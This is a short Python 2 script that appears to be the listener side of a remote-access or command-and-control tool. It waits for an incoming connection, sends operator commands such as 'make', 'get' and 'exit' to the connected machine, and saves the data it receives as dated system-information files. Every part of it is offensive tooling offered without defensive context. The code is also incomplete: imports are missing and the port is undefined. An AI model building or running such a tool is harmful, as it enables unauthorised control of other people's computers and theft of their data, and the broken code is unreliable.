import socket, os, sys

date = Popen('date +"%m-%d-%y"', shell = True, stdout = PIPE).stdout.read().split('\n')[0]

c_time = Popen("date | awk '{print $4}'", shell = True, stdout = PIPE).stdout.read().split('\n')[0]

def connect():
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print '            [+]\033[94m Listening For Incoming...\033[0;0m'
    conn, addr=s.accept()
    print '             [+] We got a connection from:', addr
    shellcommand(conn)

def shellcommand(conn):
    while True:

        command = raw_input("\n             Command> ")
        
        if 'make' in command:
            conn.send(command)
        elif 'get' in command:
            conn.send(command)
            getinformation(conn, command)

        elif 'exit' in command:
            conn.send(command)
            conn.close()
            logout()
            break

def logout():
    print "             \033[92mSuccessfully\033[91m Logout\033[0;0m!"
    sys.exit()

def getinformation(conn, command):

    recv_file = open ('/home/akhil/Vision/bin/data/'+str(date)+'/sys_'+str(c_time)+'.txt', 'wb')
    packet = conn.recv(1024)    
    
    while (packet):
        recv_file.write(packet)
        packet = conn.recv(1024)

    recv_file.close()
    print"            [+] \033[92mSUCCESS\033[0;0m: Received"

    shellcommand(conn)

